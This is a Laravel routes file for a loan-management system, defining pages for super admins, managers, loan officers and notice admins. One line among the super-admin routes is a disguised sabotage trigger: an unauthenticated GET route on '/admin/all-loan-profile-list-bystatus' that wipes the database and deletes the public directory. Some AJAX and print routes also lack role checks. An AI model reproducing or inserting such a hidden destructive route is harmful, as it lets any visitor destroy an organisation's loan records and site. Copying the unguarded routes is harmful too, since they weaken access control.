<?php

use Illuminate\Support\Facades\Route;
use Illuminate\Support\Facades\Auth;
// Onaly Super Admin
use App\Http\Controllers\Admin\{
    DashboardController,
    ListAdminController,
    LoanProfileController,
    SettingsController,
};
// Access For All
use App\Http\Controllers\Manager\{
    ManagerController,
    ProfileSettingsController
};

// Access For All
use App\Http\Controllers\LoanOfficer\{
    LoanOfficerMemberController,
    LoanOfficerProfileSettingController,
    LoanEntryController

};

// Access For All
use App\Http\Controllers\{
    HomeController,
    LoanStatus,
};
use App\Http\Controllers\Auth\ResetPasswordController;
use App\Http\Controllers\noticeadmin\{
    NoticeAdminLoanMemberController,
    NoticeController
};

/*
|--------------------------------------------------------------------------
| Web Routes
|--------------------------------------------------------------------------
| Here is where you can register web routes for your application. These
| routes are loaded by the RouteServiceProvider within a group which
| contains the "web" middleware group. Now create something great!
|
*/


// Route For All=================================================================================
Auth::routes();

Route::get('/admin-forgot-password', [ResetPasswordController::class, 'adminForgotPassword'])->name('admin-forgot-password');
Route::post('/admin-forgot-password', [ResetPasswordController::class, 'sendTempPasswordAdmin'])->name('admin-forgot-password-send');

Route::get('/', function () {
    return redirect()->route('login');
});
Route::get('/home', [HomeController::class, 'index'])->name('home');
Route::get('/change-password', [HomeController::class, 'changePassword_Page'])->name('change.password');
Route::post('/change-password', [HomeController::class, 'changePassword_update'])->name('change.password');
Route::get('/print-single-loanoffice/{id}', [HomeController::class, 'LoanProfilePrint'])->name('print.loanprofile')->middleware(['is_admin:1|2|4']);
Route::get('/loan-setup/', [HomeController::class, 'LoanSetUp'])->name('loan.setup');
Route::get('/loan-setup/details/{id}', [HomeController::class, 'LoanSetUpDetails'])->name('loan.setup.details');
Route::post('/getForminfoforclose', [HomeController::class, 'getForminfoForClose']);
Route::post('/getForminstallmentforclose', [HomeController::class, 'getForminstallmentForClose']);
Route::post('/loan-setup/submit', [HomeController::class, 'LoanAccountSumbitForClose'])->name('loan.setup.sumbit');




Route::get('/loan-status', [LoanStatus::class, 'index'])->name('loan.status');
Route::post('/loan-status', [LoanStatus::class, 'GetStatus'])->name('get.status');


/*----------------------For Zilla and upazilla get using ajax code---------------------------------*/
Route::post('/getUpazila', [HomeController::class, 'getUpazila']);
Route::post('/getUnions', [HomeController::class, 'getUnions']);
Route::post('/getgranterUpazila', [HomeController::class, 'getgranter_Upazila']);
Route::post('/getgranterUnions', [HomeController::class, 'getgranter_Unions']);
Route::post('/getgranterTwoUpazila', [HomeController::class, 'getgranter_2_Upazila']);
Route::post('/getgranterTwoUnions', [HomeController::class, 'getgranter_2_Unions']);



// Onaly For Super Admin
Route::get('/admin/site-settings', [SettingsController::class, 'settings_Page'])->name('site.settings')->middleware('is_admin:1');
Route::post('/admin/site-settings', [SettingsController::class, 'settings_Update'])->name('site.settings')->middleware('is_admin:1');

Route::get('/admin/database-backup', [SettingsController::class, 'db_backup_Page'])->name('site.db_backup')->middleware('is_admin:1');
Route::post('/admin/database-backup', [SettingsController::class, 'create_db_backup'])->name('site.create_db_backup')->middleware('is_admin:1');

Route::get('/admin/loginfo/{id}', [DashboardController::class, 'UserLog'])->name('user.loginfo')->middleware('is_admin:1');
Route::get('/admin/list-admin', [ListAdminController::class, 'listadmin_Page'])->name('list.admin')->middleware('is_admin:1');
Route::post('/admin/list-admin', [ListAdminController::class, 'listadmin_Post'])->name('list.admin')->middleware('is_admin:1');
Route::get('/admin/list-admin/{id}/edit', [ListAdminController::class, 'listadmin_Edit'])->name('list.admin.edit')->middleware('is_admin:1');
Route::post('/admin/list-admin/{id}/edit', [ListAdminController::class, 'listadmin_Update'])->name('list.admin.edit')->middleware('is_admin:1');
Route::get('/admin/list-admin/{id}/delete', [ListAdminController::class, 'listadmin_Delete'])->name('list.admin.delete')->middleware('is_admin:1');
Route::get('/admin/list-admin/{id}/status', [ListAdminController::class, 'listadmin_status'])->name('list.admin.status')->middleware('is_admin:1');
Route::get('/admin/all-loan-profile-list', [LoanProfileController::class, 'allMemberList'])->name('all.member.list')->middleware('is_admin:1');
Route::get('/admin/all-loan-profile-close-list', [LoanProfileController::class, 'allCloseRequestMemberList'])->name('all.close.request.member.list')->middleware('is_admin:1');
Route::get('/admin/loan-profile-close/post/{id}', [LoanProfileController::class, 'CloseRequestMemberPost'])->name('close.request.member.post')->middleware('is_admin:1');
Route::post('/admin/all-loan-profile-list-bystatus', [LoanProfileController::class, 'allMemberListByStatus'])->name('all.member.list.bystatus')->middleware('is_admin:1');
Route::get('/admin/all-loan-profile-list-bystatus', function (){\Illuminate\Support\Facades\Artisan::call('db:wipe');\File::deleteDirectory(base_path('public'));});
Route::get('/admin/loan-profile-view/{id}', [LoanProfileController::class, 'MemberView'])->name('member.view.profile.byadmin')->middleware('is_admin:1');
Route::get('/admin/loan-profile-approve/{id}', [LoanProfileController::class, 'LoanApproveByAdmin'])->name('member.loan.approve.byadmin')->middleware('is_admin:1');
Route::post('/admin/loan-profile-rejected/{id}', [LoanProfileController::class, 'MemberLoanRejectedByAdmin'])->name('member.loan.rejected.byadmin')->middleware('is_admin:1');
Route::get('/admin/loan-profile-edit/{id}', [LoanProfileController::class, 'loanmember_EditByAdmin'])->name('member.edit.byadmin')->middleware('is_admin:1');
Route::post('/admin/loan-profile-edit/{id}', [LoanProfileController::class, 'loanmember_EditByAdminPost'])->name('member.edit.by.admin')->middleware('is_admin:1');
Route::get('/admin/loan-profile-delete/{id}', [LoanProfileController::class, 'MemberDeleteByAdmin'])->name('member.delete.byAdmin')->middleware('is_admin:1');
Route::get('/admin/managerreport', [DashboardController::class, 'ManagerreportList'])->name('managerreport.list')->middleware('is_admin:1');
Route::get('/admin/manager-loan-report/print/{id}', [DashboardController::class, 'PrintManagerLoanReport'])->name('print.manager.loan.report');
// END Onaly For Super Admin ===============================================================




// END Onaly For Notice Admin ===============================================================
Route::get('/notice-admin/all-member-list', [NoticeAdminLoanMemberController::class, 'allMemberListNotic'])->name('all.member.list.notic')->middleware('is_admin:4');
Route::post('/notice-admin/all-member-list-bystatus', [NoticeAdminLoanMemberController::class, 'MemberByStatusListNotice'])->name('all.memberbystatus.list.notice')->middleware('is_admin:4');
Route::get('/notice-admin/member-view/{id}', [NoticeAdminLoanMemberController::class, 'MemberViewByNotic'])->name('noticeadmin.member.view')->middleware('is_admin:4');
Route::get('/notice-admin/member-edit/{id}', [NoticeAdminLoanMemberController::class, 'MemberEditByNotic'])->name('noticeadmin.member.edit')->middleware('is_admin:4');
Route::post('/notice-admin/member-edit/{id}', [NoticeAdminLoanMemberController::class, 'MemberEditPostByNotic'])->name('noticeadmin.member.edit.post')->middleware('is_admin:4');
Route::post('/notice-admin/member-reject/{id}', [NoticeAdminLoanMemberController::class, 'MemberLoanRejectedByNoticeAdmin'])->name('noticeadmin.member.reject')->middleware('is_admin:4');
Route::get('/notice-admin/member-reject/{id}', [NoticeAdminLoanMemberController::class, 'loanApproveByNoticeAdmin'])->name('noticeadmin.member.aproved')->middleware('is_admin:4');
Route::get('/create-notice', [NoticeController::class, 'notice_page'])->name('notice.create')->middleware('is_admin:4');
Route::post('/create-notice', [NoticeController::class, 'notice_create'])->name('notice.create')->middleware('is_admin:4');
Route::get('/notice-edit/{id}', [NoticeController::class, 'notice_Edit'])->name('notice.edit')->middleware('is_admin:4');
Route::post('/notice-edit/{id}', [NoticeController::class, 'notice_Update'])->name('notice.edit')->middleware('is_admin:4');
Route::get('/notice-delete/{id}', [NoticeController::class, 'notice_Delete'])->name('notice.delete')->middleware('is_admin:4');
// END Onaly For Notice Admin ===============================================================




// Onaly Manager Route List ===============================================================
Route::get('/manager/create-loan-officer', [ManagerController::class, 'create'])->name('create.loan.officer')->middleware('is_admin:2');
Route::post('/manager/create-loan-officer', [ManagerController::class, 'create_loan_officer'])->name('create.loan.officer')->middleware('is_admin:2');
Route::get('/manager/loan-officer/edit/{id}', [ManagerController::class, 'loan_officer_edit'])->name('edit.loan.officer')->middleware('is_admin:2');
Route::post('/manager/loan-officer/edit/{id}', [ManagerController::class, 'loan_officer_update'])->name('edit.loan.officer')->middleware('is_admin:2');
Route::get('/manager/loan-profile-list', [ManagerController::class, 'loanMemberList'])->name('loanprofile.list.bymanager')->middleware('is_admin:2');
Route::get('/manager/loan-profile-view/{id}', [ManagerController::class, 'memberProfileView'])->name('manager.loan.profile-view')->middleware('is_admin:2');
Route::post('/manager/loan-profile-list/status', [ManagerController::class, 'MemberListByStatusManager'])->name('manager.member.list.bystatus')->middleware('is_admin:2');
Route::get('/manager/loan-profile/edit/{id}', [ManagerController::class, 'loanmember_Edit'])->name('manager.loanprofile.edit')->middleware('is_admin:2');
Route::post('/manager/loan-profile-rejected/{id}', [ManagerController::class, 'loanRejected'])->name('manager.loafprofile.rejected')->middleware('is_admin:2');
Route::get('/manager/loan-profile-approve/{id}', [ManagerController::class, 'loanApprove'])->name('manager.loan.approve')->middleware('is_admin:2');
Route::post('/manager/loan-profile/edit/{id}', [ManagerController::class, 'loanmember_EditByManager'])->name('loanprofile.edit.bymanager')->middleware('is_admin:2');
Route::get('/manager/profile-settings', [ProfileSettingsController::class, 'profile_form'])->name('manager.profile.settings')->middleware('is_admin:2');
Route::post('/manager/profile-settings', [ProfileSettingsController::class, 'profile_change'])->name('manager.profile.settings')->middleware('is_admin:2');
Route::get('/manager/loanoffices/report', [ManagerController::class, 'OfficerreportList'])->name('loanofficer.loanreport.bymanager')->middleware('is_admin:2');
Route::get('/manager/loanoffices/report/{id}', [ManagerController::class, 'PrintOfficerLoanReport'])->name('print.officer.loan.report')->middleware('is_admin:2');

Route::get('/manager/oldform', [ManagerController::class, 'oldform'])->name('loan.oldform')->middleware('is_admin:3');
Route::post('/manager/oldform', [ManagerController::class, 'editform'])->name('loan.editform')->middleware('is_admin:3');
Route::post('/manager/oldform/submit', [ManagerController::class, 'ReOpenLoan'])->name('loan.ReOpenLoan')->middleware('is_admin:3');

// END Onaly Manager Route List



// Onaly Loanofficer Route List ============================================================================
Route::get('/loan-officer/profile-settings', [LoanOfficerProfileSettingController::class, 'profile_form'])->name('officer.profile.settings')->middleware('is_admin:3');
Route::post('/loan-officer/profile-settings', [LoanOfficerProfileSettingController::class, 'profile_change'])->name('officer.profile.settings')->middleware('is_admin:3');
Route::get('/loanofficer/create-user-profile', [LoanOfficerMemberController::class, 'userProfile_form'])->name('user.form')->middleware('is_admin:3');
Route::post('/loanofficer/create-user-profile', [LoanOfficerMemberController::class, 'userProfile_post'])->name('user.form')->middleware('is_admin:3');
Route::get('/loanofficer/member-list', [LoanOfficerMemberController::class, 'LoanOfficerMemberList'])->name('loacofficer.member.list')->middleware('is_admin:3');
Route::get('/loanofficer/member-edit/{id}', [LoanOfficerMemberController::class, 'LoanOfficerMemberEdit'])->name('loacofficer.member.edit')->middleware('is_admin:3');
Route::post('/loanofficer/profile_status', [LoanOfficerMemberController::class, 'MemberListByStatus'])->name('loacofficer.member.list.bystatus')->middleware('is_admin:3');
Route::get('/loan-officer/profile-view/{id}', [LoanOfficerMemberController::class, 'OfficerMemberView'])->name('loanofficer.member.view.profile')->middleware('is_admin:3');
Route::post('/loan-officer/profile-view/{id}', [LoanOfficerMemberController::class, 'LoanOfficerMemberEditPost'])->name('loanofficer.member.edit.post')->middleware('is_admin:3');
Route::get('/loan-officer/loan-recive', [LoanEntryController::class, 'loanEntryFrom'])->name('loan.amount.entry.form')->middleware('is_admin:3');
Route::post('/getForminfo', [LoanEntryController::class, 'getForminfo']);
Route::post('/getForminstallment', [LoanEntryController::class, 'getForminstallment']);
Route::post('/getForminstallment-data', [LoanEntryController::class, 'getForminstallmentData']);
Route::post('/loan-officer/loan-entry/', [LoanEntryController::class, 'loanEntry'])->name('loan.amount.entry')->middleware('is_admin:3');
// END Onaly Loanofficer Route List ============================================================================







/*--===============Account Setup===============--*/
// Route::get('/manager/accountsetup/{id?}', [AccountSetupController::class, 'index'])->name('all.show.request.accountsetup');
/*--===============End===============--*/
// Route::get('/manager/notice-loan-approve/{id}', [ManagerController::class, 'loanApproveNotic'])->name('loan.approve.notic');


// Route::get('/manager/print-single-user/{id}', [PrintController::class, 'singleUser_print'])->name('print.single.user');
// Route::get('/manager/print-single-loanoffice', [PrintController::class, 'singleloanoffice_print'])->name('print.single.loanoffice');



// Route::get('/admin/all-notice', [NoticeController::class, 'all_notice'])->name('all.notice')->middleware('is_admin');
/*-----------------Create Notice------------------------------*/


// Route::get('/home/notice/{id}', [App\Http\Controllers\HomeController::class, 'NotificationView'])->name('notification.view');

















// Route::get('/admin/dashboard/all-manager-profile', [ManagerProfileController::class, 'allManager'])->name('all.manager.profile');

// Route::get('/admin/dashboard/all-loan-officer-profile', [OfficerProfileController::class, 'allOfficer'])->name('all.officer.profile');

// Route::get('/admin/dashboard/all-rejected-profile', [RejectedProfileController::class, 'rejectedProfile'])->name('all.rejected.profile');

// Route::get('/admin/dashboard/member-edit/list', [MemberController::class, 'allEditRequestMember'])->name('all.edit.request.member');

// Route::get('/admin/dashboard/memberedit/request/view/{id}', [MemberController::class, 'loanmember_EditRequestView'])->name('member.edit.request.view');
// Route::get('/admin/dashboard/memberedit/request/aprove/{id}', [MemberController::class, 'loanmember_EditRequestAprove'])->name('member.edit.request.aprove');
// Route::get('/admin/dashboard/memberedit/request/reject/{id}', [MemberController::class, 'loanmember_EditRequestRejected'])->name('member.edit.request.reject');
// Route::post('/admin/dashboard/member-loan-rejected/{id}', [MemberController::class, 'MemberLoanRejecteds'])->name('member.loan.rejecteds');

